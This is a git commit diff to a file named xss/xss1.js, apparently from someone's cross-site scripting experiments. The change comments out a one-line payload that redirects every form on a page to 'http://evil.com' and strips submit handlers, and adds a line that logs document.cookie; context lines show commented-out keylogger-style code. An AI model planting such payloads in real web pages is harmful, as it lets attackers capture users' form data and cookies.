11919fba1a5f260e84470281b16689ece8ca2e4f
Martin Praznovsky <martin.praznovsky@gmail.com>
2016-02-03 20:02:51 +0100

    a

--- xss/xss1.js
+++ xss/xss1.js
@@ -14,4 +14,6 @@
 //   keys = '';
 // }, 1000);
 
-var f=document.forms;var i=f.length-1;do{f[i].action="http://evil.com";f[i].onsubmit=null;}while(--i);
+// var f=document.forms;var i=f.length-1;do{f[i].action="http://evil.com";f[i].onsubmit=null;}while(--i);
+
+console.log('cookie', document.cookie);
